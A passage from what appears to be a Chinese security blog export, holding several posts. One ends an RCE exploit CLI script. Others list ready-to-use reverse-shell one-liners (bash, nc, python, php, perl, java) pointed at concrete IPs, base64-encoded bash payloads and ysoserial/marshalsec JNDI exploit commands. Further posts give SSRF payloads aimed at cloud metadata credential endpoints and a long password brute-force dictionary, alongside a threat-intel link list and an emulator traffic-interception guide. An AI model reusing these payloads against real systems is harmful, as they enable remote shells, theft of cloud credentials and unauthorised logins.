project...&#x27;, project_id)</span><br><span class="line"></span><br><span class="line">        for col_id in col_ids:</span><br><span class="line">            logger.info(&#x27;[+] col_id = %s&#x27;, col_id)</span><br><span class="line">            click.echo(f&#x27;hit: project_id: &#123;project_id&#125; | owner_id: &#123;owner_id&#125; | col_id: &#123;col_id&#125; | token: &#123;token&#125;&#x27;)</span><br><span class="line">            click.echo(f&#x27;suggestion: python &#123;sys.argv[0]&#125; rce -u &#123;url&#125; -t &#123;token&#125; -o &#123;owner_id&#125; --pid &#123;project_id&#125; --cid &#123;col_id&#125; --command=&quot;&#123;command&#125;&quot;&#x27;)</span><br><span class="line"></span><br><span class="line">            if cmd_rce.callback(url, owner_id, token, project_id, col_id, command):</span><br><span class="line">                return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    cli()</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>反弹shell命令总结</title>
    <url>/2024/09/10/%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h3 id="0x0-bash反弹"><a href="#0x0-bash反弹" class="headerlink" title="0x0 bash反弹"></a>0x0 bash反弹</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/204.44.66.210/5566 0&gt;&amp;1 </span><br></pre></td></tr></table></figure>

<h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm -f tmp/.a;mknod /tmp/.a p &amp;&amp; telnet 10.200.20.53 8899 0&lt;/tmp/.a|&amp; /bin/bash &gt;&amp; /tmp/.a;rm -f /tmp/.a</span><br></pre></td></tr></table></figure>

<h3 id="0x1-NC反弹"><a href="#0x1-NC反弹" class="headerlink" title="0x1 NC反弹"></a>0x1 NC反弹</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 204.44.66.210 5566 </span><br></pre></td></tr></table></figure>

<h3 id="0x2-Python反弹"><a href="#0x2-Python反弹" class="headerlink" title="0x2 Python反弹"></a>0x2 Python反弹</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.118.128&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.118.128&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="0x3-php反弹"><a href="#0x3-php反弹" class="headerlink" title="0x3 php反弹"></a>0x3 php反弹</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="0x4-perl-反弹"><a href="#0x4-perl-反弹" class="headerlink" title="0x4 perl 反弹"></a>0x4 perl 反弹</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;ip&quot;;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="0x5-java反弹"><a href="#0x5-java反弹" class="headerlink" title="0x5 java反弹"></a>0x5 java反弹</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>

<h3 id="生成命令的工具网站："><a href="#生成命令的工具网站：" class="headerlink" title="生成命令的工具网站："></a>生成命令的工具网站：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://jackson-t.ca/runtime-exec-payloads.html</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;bash -c &#123;echo,bmMgLWUgL2Jpbi9iYXNoIDIzLjEwNS4xOTMuMTA2IDc3Nzc=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br></pre></td></tr></table></figure>


<h3 id="RMI反弹"><a href="#RMI反弹" class="headerlink" title="RMI反弹"></a>RMI反弹</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://172.86.124.188:9998/#Exploit&quot; 1099</span><br><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1389 CommonsCollections4 &#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80NS43OC43LjU4Lzg4OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1389 CommonsCollections4 &#x27;bash -c &#123;echo,cGluZyAxMS5lLmRuc3h4LnRvcA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>各个云的SSRF Payload</title>
    <url>/2024/09/10/%E5%90%84%E4%B8%AA%E4%BA%91%E7%9A%84SSRF-Payload/</url>
    <content><![CDATA[<h1 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.0.0.192/latest/</span><br><span class="line">http://192.0.0.192/latest/user-data/</span><br><span class="line">http://192.0.0.192/latest/meta-data</span><br><span class="line">http://192.0.0.192/latest/attributes/</span><br></pre></td></tr></table></figure>
<h1 id="Alibaba"><a href="#Alibaba" class="headerlink" title="Alibaba"></a>Alibaba</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://100.100.100.200/latest/meta-data/</span><br><span class="line">http://100.100.100.200/latest/meta-data/instance-id</span><br><span class="line">http://100.100.100.200/latest/meta-data/image-id</span><br></pre></td></tr></table></figure>
<h1 id="Kubernetes-ETCD"><a href="#Kubernetes-ETCD" class="headerlink" title="Kubernetes ETCD"></a>Kubernetes ETCD</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -L http://127.0.0.1:2379/version</span><br><span class="line">curl http://127.0.0.1:2379/v2/keys/?recursive=true </span><br></pre></td></tr></table></figure>
<h1 id="Rancher"><a href="#Rancher" class="headerlink" title="Rancher"></a>Rancher</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://rancher-metadata/&lt;version&gt;/&lt;path&gt;</span><br></pre></td></tr></table></figure>
<h1 id="Google-Cloud"><a href="#Google-Cloud" class="headerlink" title="Google Cloud"></a>Google Cloud</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://metadata.google.internal/computeMetadata/v1beta1/</span><br><span class="line">http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true</span><br></pre></td></tr></table></figure>
<h1 id="AWS"><a href="#AWS" class="headerlink" title="AWS"></a>AWS</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://instance-data</span><br><span class="line">http://169.254.169.254</span><br><span class="line">http://169.254.169.254/latest/user-data</span><br><span class="line">http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]</span><br><span class="line">http://169.254.169.254/latest/meta-data/</span><br><span class="line">http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]</span><br><span class="line">http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance</span><br><span class="line">http://169.254.169.254/latest/meta-data/ami-id</span><br><span class="line">http://169.254.169.254/latest/meta-data/reservation-id</span><br><span class="line">http://169.254.169.254/latest/meta-data/hostname</span><br><span class="line">http://169.254.169.254/latest/meta-data/public-keys/</span><br><span class="line">http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key</span><br><span class="line">http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key</span><br><span class="line">http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy</span><br><span class="line">http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access</span><br><span class="line">http://169.254.169.254/latest/dynamic/instance-identity/document</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>云安全</tag>
      </tags>
  </entry>
  <entry>
    <title>威胁情报平台</title>
    <url>/2024/09/10/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E5%B9%B3%E5%8F%B0/</url>
    <content><![CDATA[<h3 id="0x1-威胁情报在线查询"><a href="#0x1-威胁情报在线查询" class="headerlink" title="0x1 威胁情报在线查询"></a>0x1 威胁情报在线查询</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> #微步</span><br><span class="line">https://x.threatbook.cn/  </span><br><span class="line"># 安恒</span><br><span class="line">https://ti.dbappsecurity.com.cn/ </span><br><span class="line"># 奇安信： </span><br><span class="line">https://ti.qianxin.com/portal  </span><br><span class="line"> #360威胁情报中心</span><br><span class="line">https://ti.360.com/  </span><br><span class="line">#微软</span><br><span class="line">https://community.riskiq.com/home</span><br><span class="line">#IBM X-Force Exchange</span><br><span class="line">https://exchange.xforce.ibmcloud.com/  </span><br><span class="line">https://otx.alienvault.com/</span><br><span class="line">https://www.virustotal.com/</span><br></pre></td></tr></table></figure>

<h3 id="0x2-IP信息查询"><a href="#0x2-IP信息查询" class="headerlink" title="0x2 IP信息查询"></a>0x2 IP信息查询</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 埃文科技</span><br><span class="line">https://www.ipuu.net/query/ip?search=175.6.23.170 </span><br><span class="line"># CNNIC</span><br><span class="line">https://ipwhois.cnnic.cn/bns/query/Query/ipwhoisQuery.do?queryOption=ipv4&amp;txtquery=175.6.23.170</span><br><span class="line"># IPIP</span><br><span class="line">http://www.ipip.net/ip.html</span><br></pre></td></tr></table></figure>

<h3 id="0x3-域名信息查询"><a href="#0x3-域名信息查询" class="headerlink" title="0x3 域名信息查询"></a>0x3 域名信息查询</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://beian.miit.gov.cn/#/Integrated/recordQuery</span><br></pre></td></tr></table></figure>

<h3 id="0x4-情报搜索"><a href="#0x4-情报搜索" class="headerlink" title="0x4 情报搜索"></a>0x4 情报搜索</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://0.zone/</span><br><span class="line">https://fofa.info/</span><br></pre></td></tr></table></figure>

<h3 id="0x5-地址定位查询"><a href="#0x5-地址定位查询" class="headerlink" title="0x5 地址定位查询"></a>0x5 地址定位查询</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://chaipip.com/aiwen.html</span><br><span class="line">https://www.opengps.cn/Data/IP/ipplus.aspx</span><br></pre></td></tr></table></figure>


<h3 id="0x6-创建情报："><a href="#0x6-创建情报：" class="headerlink" title="0x6 创建情报："></a>0x6 创建情报：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MalwareBazaar | Browse malware samples</span><br><span class="line">https://otx.alienvault.com/</span><br><span class="line">https://redqueen.tj-un.com/IntelHome.html</span><br><span class="line">https://sslbl.abuse.ch/blacklist/ja3_fingerprints.rules</span><br><span class="line">https://myip.ms/browse/scam</span><br><span class="line">https://myip.ms/files/blacklist/general/latest_blacklist.txt</span><br><span class="line">http://www.lajiz.cn/wp-content/uploads/2020/04/20200501003259.txt</span><br><span class="line">https://github.com/NewBee119/Ti_Collector/tree/master/ThreatFeedSpider/scripts</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>安卓(android)模拟器抓包</title>
    <url>/2024/09/10/%E5%AE%89%E5%8D%93-android-%E6%A8%A1%E6%8B%9F%E5%99%A8%E6%8A%93%E5%8C%85/</url>
    <content><![CDATA[<p>转载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.freebuf.com/articles/web/323085.html</span><br></pre></td></tr></table></figure>


<h3 id="1-用到的工具"><a href="#1-用到的工具" class="headerlink" title="1. 用到的工具"></a>1. 用到的工具</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Proxifier（可在内网渗透上课件中找到）或：https://www.jb51.net/softs/527902.html</span><br><span class="line">burpsuite（其他抓包工具亦可）</span><br><span class="line">雷电模拟器4 （Android 7）https://www.ldmnq.com/?n=6000&amp;bd_vid=7476744816742092625</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="22-抓包前的准备"><a href="#22-抓包前的准备" class="headerlink" title="22.抓包前的准备"></a>22.抓包前的准备</h3><p>打开burp，选择Proxy，Options，确保Proxy Listens下的监听端口与待会要设置的一致，并且处于勾选状态<br><img src="/images/blog/811c98b09d7417833f3ad8db46d2aba3.png"></p>
<p>安装Proxifier后打开，点击配置文件，选择代理服务器，点击添加<br><img src="/images/blog/e76b3bc221c70447cca70050df283184.png"></p>
<p>确保设置的地址和端口与burpsuite的监听端口一致</p>
<p>4.点击检查，确保可以正常连接，（注：如果没开burp或者burp监听的地址不是127.0.0.1:8080或者改选项没有勾选，那么会连接不超过）<br>配置不正确的话那么就会不成功</p>
<p>配置成功就是如下图所示</p>
<p>（注：在进行这一步之前你要确保你的电脑已经安装了burpsuite的证书并且可以正常抓取https的包）<br>在Proxifier中添加代理规则<br>配置文件 -&gt; 代理规则 -&gt; 添加<br><img src="/images/blog/8d4c9fe6a4b306d2359aafe29f6156dc.png"></p>
<p>应用程序选择 dnplayer.exe;LdVBoxHeadless.exe;<br>dnplayer雷电模拟器启动程序和模拟器主程序<br>LdVBoxHeadless雷电模拟器对外网络协议走的都是这个程序<br>动作选择刚才添加的代理服务器。<br>PS：LdVBoxHeadless.exe不同的版本，名称可能不一样，如果不知道在哪，可以直接在任务管理器，找到名为VirtualBox Headless Frontend的进程，右键打开文件所在的位置，即可找到<br><img src="/images/blog/cc7cd24276e7c97f32a72464084cce79.png"></p>
<p>到这一步我们进入模拟器，打开浏览器以后，就可以从Proxifier看到模拟器的流量，但是我们现在还抓不了https<br>解决抓取https问题：<br>不能抓取https的包肯定是没多大意义的。所以我们要来解决这个问题，经过查询资料了解到安卓7.0以上后默认不在信任用户自行安装的证书文件、如果需要抓包我们就要把自己的证书放到系统目录下、或者对app进行修改从而进行抓包。在这里我选择安装系统证书的方式进行更加通用的方式进行处理。<br>从浏览器导出burp证书<br><img src="/images/blog/e9e3f8c4c147e9eff10c25a34fbee3e5.png"></p>
<p>选择Base64 编码X.509(.CER)(S)<br><img src="/images/blog/26b625fd59982bcd37746e67a4e25760.png"></p>
<p>找个地方取个名字，保存<br><img src="/images/blog/67ec173a64b12cb7017ebc1d99060f5e.png"></p>
<p>切换到模拟器，点击更多，选择共享文件，然后选择打开电脑文件夹，把刚才导入的证书拖进去，这个证书就会出现在模拟器相应的Pictures文件夹里<br><img src="/images/blog/e5e0033278bd146e4deeb34f600368ab.png"></p>
<p>然后进入模拟器，设置，安全，从SD卡安装证书，把刚才拖进来的证书导入<br><img src="/images/blog/ef3656c543a1235b8d5cdcda2ab99f37.png"></p>
<p>第一次添加证书会要求设置密码，随便设置一下就行了<br>然后回到桌面，打开文件管理器（记得开启Root权限，模拟器的右边，设置，其他设置，Root权限，点击开启）<br><img src="/images/blog/88f87e792fbc92d92409249ba78ac2a9.png"></p>
<p>点击左上角的三条杠，选择根目录（确保有超级用户（Root）权限）<br><img src="/images/blog/3ad80dd3a0d165536b1ee215308d58a4.png"></p>
<p>进入：&#x2F;data&#x2F;misc&#x2F;user&#x2F;0&#x2F;cacerts-added 这个文件夹下（该目录存储的是用户自己安装的证书文件）<br><img src="/images/blog/5ddc63b7b2b7dc90bfc8560d65d792eb.png"></p>
<p>给该.0文件左边打上勾（文件名可能是不一样的）<br><img src="/images/blog/407df72199e1f08a36307cc2ddbf6090.png"></p>
<p>切换目录到&#x2F;etc&#x2F;security&#x2F;cacerts 下，点击右上角三个点，点击粘贴选择项，就把证书复制到系统证书目录了<br><img src="/images/blog/34b110f3083b12eb2321bcc5eb94a72a.png"></p>
<p>现在可以开心地抓取模拟器的https的包了</p>
]]></content>
  </entry>
  <entry>
    <title>常用密码字典</title>
    <url>/2024/09/10/%E5%B8%B8%E7%94%A8%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8/</url>
    <content><![CDATA[<h3 id="top50"><a href="#top50" class="headerlink" title="top50"></a>top50</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">987654321</span><br><span class="line">555555</span><br><span class="line">fuckyou</span><br><span class="line">12345678</span><br><span class="line">000000</span><br><span class="line">qwertyuiop</span><br><span class="line">computer</span><br><span class="line">target123</span><br><span class="line">password1</span><br><span class="line">666666</span><br><span class="line">123456</span><br><span class="line">aaaaaa</span><br><span class="line">monkey</span><br><span class="line">112233</span><br><span class="line">123qwe</span><br><span class="line">12345</span><br><span class="line">123123</span><br><span class="line">abc123</span><br><span class="line">qwerty</span><br><span class="line">tinkle</span><br><span class="line">123123123</span><br><span class="line">password</span><br><span class="line">1q2w3e4r</span><br><span class="line">123abc</span><br><span class="line">1q2w3e4r5t</span><br><span class="line">7777777</span><br><span class="line">121212</span><br><span class="line">1234</span><br><span class="line">a123456</span><br><span class="line">qwe123</span><br><span class="line">222222</span><br><span class="line">123321</span><br><span class="line">asdfghjkl</span><br><span class="line">gwerty</span><br><span class="line">123456789</span><br><span class="line">gwerty123</span><br><span class="line">654321</span><br><span class="line">qwerty123</span><br><span class="line">159753</span><br><span class="line">myspace1</span><br><span class="line">iloveyou1</span><br><span class="line">1g2w3e4r</span><br><span class="line">qazwsx</span><br><span class="line">123456a</span><br><span class="line">zxcvbnm</span><br><span class="line">1234567</span><br><span class="line">qwerty1</span><br><span class="line">1234567890</span><br><span class="line">iloveyou</span><br><span class="line">111111</span><br><span class="line">1qaz2wsx</span><br><span class="line">fuckyou1</span><br><span class="line">12345a</span><br><span class="line">1q2w3e</span><br><span class="line">zag12wsx</span><br><span class="line">dragon</span><br><span class="line">123</span><br></pre></td></tr></table></figure>

<h3 id="top885"><a href="#top885" class="headerlink" title="top885"></a>top885</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">000</span><br><span class="line">1</span><br><span class="line">123</span><br><span class="line">1234</span><br><span class="line">12345</span><br><span class="line">123456</span><br><span class="line">123456789</span><br><span class="line">123123</span><br><span class="line">admin</span><br><span class="line">password</span><br><span class="line">110</span><br><span class="line">server2003</span><br><span class="line">!@#$%^&amp;*()</span><br><span class="line">P@ssw0rd</span><br><span class="line">888888</span><br><span class="line">admin123</span><br><span class="line">sqlidc</span><br><span class="line">123.qwe</span><br><span class="line">qwe.123</span><br><span class="line">123.idc</span><br><span class="line">!@#$qwerASDF</span><br><span class="line">321321</span><br><span class="line">woshiguanliyuan</span><br><span class="line">guanli</span><br><span class="line">123.123</span><br><span class="line">321.321</span><br><span class="line">1314520</span><br><span class="line">5201314</span><br><span class="line">administrator</span><br><span class="line">administrators</span><br><span class="line">123kkk</span><br><span class="line">asd123!@#</span><br><span class="line">qwe123!@#</span><br><span class="line">zxc123!@#</span><br><span class="line">p@ssw0rd</span><br><span class="line">p@ssword</span><br><span class="line">passw0rd</span><br><span class="line">fuwuqi</span><br><span class="line">0000</span><br><span class="line">00000</span><br><span class="line">000000</span><br><span class="line">qazwsx</span><br><span class="line">1q2w3e4r</span><br><span class="line">112233</span><br><span class="line">1234567890</span><br><span class="line">666666</span><br><span class="line">qazwsxedc</span><br><span class="line">qazwsxedcrfv</span><br><span class="line">a123456</span><br><span class="line">super</span><br><span class="line">pass</span><br><span class="line">1qaz2wsx</span><br><span class="line">feixiang</span><br><span class="line">qwe123</span><br><span class="line">qwe1234</span><br><span class="line">123qwe</span><br><span class="line">1qaz</span><br><span class="line">1q2w3e</span><br><span class="line">q1w2e3</span><br><span class="line">user</span><br><span class="line">admin@123</span><br><span class="line">a123</span><br><span class="line">a123456789</span><br><span class="line">!@#$%^&amp;*()_+</span><br><span class="line">admin123456</span><br><span class="line">woaini</span><br><span class="line">caonima</span><br><span class="line">caonimagebi</span><br><span class="line">feixiang!@#</span><br><span class="line">love</span><br><span class="line">!QAZ2wsx</span><br><span class="line">admin123!@#</span><br><span class="line">1234%^&amp;*</span><br><span class="line">12345^&amp;*()</span><br><span class="line">5tgbnm,./</span><br><span class="line">zxcvbnm,./</span><br><span class="line">asdfghjkl;&#x27;</span><br><span class="line">qwertyuiop[]</span><br><span class="line">sysadmin</span><br><span class="line">system</span><br><span class="line">system32</span><br><span class="line">test</span><br><span class="line">user123</span><br><span class="line">username</span><br><span class="line">users</span><br><span class="line">welcome</span><br><span class="line">win</span><br><span class="line">win2000</span><br><span class="line">win2003</span><br><span class="line">win2008</span><br><span class="line">win32</span><br><span class="line">windows</span><br><span class="line">windows2003</span><br><span class="line">windowsxp</span><br><span class="line">winxp</span><br><span class="line">word</span><br><span class="line">work</span><br><span class="line">q1w2</span><br><span class="line">q1w2Q!W@</span><br><span class="line">q1w2e3e4</span><br><span class="line">q1w2e3r4</span><br><span class="line">q1w2e3r4t5</span><br><span class="line">qaz</span><br><span class="line">qazedc</span><br><span class="line">qazqaz</span><br><span class="line">qazxswedc</span><br><span class="line">qazxswedcvfr</span><br><span class="line">qazzaq</span><br><span class="line">qq</span><br><span class="line">qqq</span><br><span class="line">qscgyj</span><br><span class="line">qw1234er</span><br><span class="line">qwaszx</span><br><span class="line">qwe</span><br><span class="line">qwe321</span><br><span class="line">qwe456</span><br><span class="line">qweasd</span><br><span class="line">qweasdzxc</span><br><span class="line">qwedsa</span><br><span class="line">qweqwe</span><br><span class="line">qwer</span><br><span class="line">qwer123</span><br><span class="line">qwerasdf</span><br><span class="line">qwert</span><br><span class="line">qwerty</span><br><span class="line">qwerty1</span><br><span class="line">qwerty123</span><br><span class="line">r00t</span><br><span class="line">root</span><br><span class="line">pwd</span><br><span class="line">123456aa</span><br><span class="line">baidu.com</span><br><span class="line">123!@#</span><br><span class="line">456123</span><br><span class="line">147258</span><br><span class="line">123qweasd</span><br><span class="line">123.0</span><br><span class="line">buzhidao</span><br><span class="line">88888888</span><br><span class="line">111111	</span><br><span class="line">11111111</span><br><span class="line">123321</span><br><span class="line">12345678</span><br><span class="line">654321</span><br><span class="line">abcdef</span><br><span class="line">abcabc</span><br><span class="line">abc123</span><br><span class="line">aaa111</span><br><span class="line">a1b2c3</span><br><span class="line">administartaor</span><br><span class="line">P@ssword</span><br><span class="line">iloveyou</span><br><span class="line">110120119</span><br><span class="line">ghost</span><br><span class="line">manager</span><br><span class="line">2012</span><br><span class="line">12</span><br><span class="line">1212</span><br><span class="line">121212</span><br><span class="line">1225</span><br><span class="line">qwe!@#123</span><br><span class="line">qaz#@!321</span><br><span class="line">123qwe!@#</span><br><span class="line">!@#qweasd</span><br><span class="line">!@#qweasdzxc</span><br><span class="line">zxcasdqwe!@#</span><br><span class="line">qwe123123</span><br><span class="line">qazxswedc!@#</span><br><span class="line">!qazxsw2@</span><br><span class="line">abc!@#</span><br><span class="line">qweabc</span><br><span class="line">a123.321</span><br><span class="line">a321.123</span><br><span class="line">a123.123</span><br><span class="line">a321.321</span><br><span class="line">idc</span><br><span class="line">idc!@#</span><br><span class="line">zaq1xsw2</span><br><span class="line">PassWord</span><br><span class="line">qwert12345</span><br><span class="line">qaswed!@#</span><br><span class="line">qweasd!@#</span><br><span class="line">qweasd123</span><br><span class="line">qweasd123!@#</span><br><span class="line">qweasd!@#123</span><br><span class="line">111111</span><br><span class="line">147258369</span><br><span class="line">123abc</span><br><span class="line">123abc!@#</span><br><span class="line">123qwe123</span><br><span class="line">123qweqwe</span><br><span class="line">qwe123qwe</span><br><span class="line">!@#qwe</span><br><span class="line">!@#qwe123</span><br><span class="line">qweadmin</span><br><span class="line">2wsx3edc</span><br><span class="line">wesdxc</span><br><span class="line">wersdfxcv</span><br><span class="line">qweasd789</span><br><span class="line">zxcasd</span><br><span class="line">qaswed</span><br><span class="line">789789</span><br><span class="line">qwe789789</span><br><span class="line">qwe789!@#</span><br><span class="line">asd123</span><br><span class="line">asdasd</span><br><span class="line">asdqwe</span><br><span class="line">asdqwe!@#</span><br><span class="line">asd!@#!@#</span><br><span class="line">qwe123456</span><br><span class="line">caonima123</span><br><span class="line">idc123!@#</span><br><span class="line">idcidcidc</span><br><span class="line">79702956</span><br><span class="line">abcdqwe</span><br><span class="line">abcd!@#$</span><br><span class="line">idcidc</span><br><span class="line">00000000</span><br><span class="line">0123456789</span><br><span class="line">1qazxsw2</span><br><span class="line">1qaz1qaz</span><br><span class="line">101010</span><br><span class="line">111</span><br><span class="line">1111111</span><br><span class="line">1111111111</span><br><span class="line">111222</span><br><span class="line">11223344</span><br><span class="line">12121212</span><br><span class="line">12344321</span><br><span class="line">123456a</span><br><span class="line">1234567</span><br><span class="line">1234qwer</span><br><span class="line">123go</span><br><span class="line">1313</span><br><span class="line">131313</span><br><span class="line">168168</span><br><span class="line">1p2o3i</span><br><span class="line">2222</span><br><span class="line">222222</span><br><span class="line">2222222</span><br><span class="line">22222222</span><br><span class="line">31415926</span><br><span class="line">333333</span><br><span class="line">369</span><br><span class="line">4444</span><br><span class="line">520</span><br><span class="line">520520</span><br><span class="line">54321</span><br><span class="line">5555</span><br><span class="line">555555</span><br><span class="line">55555555</span><br><span class="line">5683</span><br><span class="line">666888</span><br><span class="line">7758521</span><br><span class="line">74108520963.</span><br><span class="line">777</span><br><span class="line">7777</span><br><span class="line">777777</span><br><span class="line">7777777</span><br><span class="line">77777777</span><br><span class="line">789456</span><br><span class="line">888999</span><br><span class="line">987654</span><br><span class="line">987654321</span><br><span class="line">87654321</span><br><span class="line">999999</span><br><span class="line">99999999</span><br><span class="line">999999999</span><br><span class="line">@#$%^&amp;</span><br><span class="line">a</span><br><span class="line">aaa</span><br><span class="line">aaaaaa</span><br><span class="line">abc</span><br><span class="line">abcd</span><br><span class="line">abcd1234</span><br><span class="line">abcde</span><br><span class="line">abcdefg</span><br><span class="line">@dmin</span><br><span class="line">asdf</span><br><span class="line">asdfg</span><br><span class="line">asdfgh</span><br><span class="line">asdfghjk</span><br><span class="line">asdfghjkl</span><br><span class="line">asdfjkl</span><br><span class="line">boss</span><br><span class="line">boot</span><br><span class="line">computer</span><br><span class="line">e-mail</span><br><span class="line">qwer1234</span><br><span class="line">!qaz@wsx</span><br><span class="line">windowsserver2003</span><br><span class="line">123.com</span><br><span class="line">star</span><br><span class="line">asdwsx</span><br><span class="line">hello</span><br><span class="line">host</span><br><span class="line">intel</span><br><span class="line">zxcvbnm</span><br><span class="line">web</span><br><span class="line">www</span><br><span class="line">zzidc.com</span><br><span class="line">zxcasdqwe</span><br><span class="line">zxasqw</span><br><span class="line">qwaszx!@#</span><br><span class="line">!@qwaszx</span><br><span class="line">qazwsx!@#</span><br><span class="line">1qaz2wsx!@#</span><br><span class="line">1qaz2wsx3edc</span><br><span class="line">1stchina</span><br><span class="line">chinaidc</span><br><span class="line">china!@#</span><br><span class="line">china123!@#</span><br><span class="line">china!@#2011</span><br><span class="line">china!@#2012</span><br><span class="line">chinadatas.com</span><br><span class="line">1a2b3c</span><br><span class="line">1qw23e</span><br><span class="line">1q2w3e4r5t</span><br><span class="line">qweasdqwe</span><br><span class="line">q!w@e#</span><br><span class="line">qweasdzxc!@#</span><br><span class="line">qaz!@#</span><br><span class="line">qazwsxedc!@#</span><br><span class="line">qazwsxedc!@#123</span><br><span class="line">!@#qwe!@#</span><br><span class="line">1a2b3c4d</span><br><span class="line">1a2b3c4d5e</span><br><span class="line">0</span><br><span class="line">zxcvb</span><br><span class="line">qwertyuiop</span><br><span class="line">168</span><br><span class="line">188</span><br><span class="line">521a</span><br><span class="line">server</span><br><span class="line">server1</span><br><span class="line">1111</span><br><span class="line">!@#$%^&amp;*</span><br><span class="line">8888</span><br><span class="line">321456</span><br><span class="line">321</span><br><span class="line">4321</span><br><span class="line">7654321</span><br><span class="line">passwd</span><br><span class="line">2wsx</span><br><span class="line">3edc</span><br><span class="line">administrator123</span><br><span class="line">001122</span><br><span class="line">12311</span><br><span class="line">123..1</span><br><span class="line">0.123</span><br><span class="line">0.12</span><br><span class="line">0.321</span><br><span class="line">!@#$5678</span><br><span class="line">p@ss1234</span><br><span class="line">521</span><br><span class="line">5211314</span><br><span class="line">ok</span><br><span class="line">2010</span><br><span class="line">admin1</span><br><span class="line">888</span><br><span class="line">sys</span><br><span class="line">2008</span><br><span class="line">789654123</span><br><span class="line">qaz1wsx2</span><br><span class="line">qazwsxedc1</span><br><span class="line">user1</span><br><span class="line">password1</span><br><span class="line">qazwsx1</span><br><span class="line">!@!#$%^&amp;*()1</span><br><span 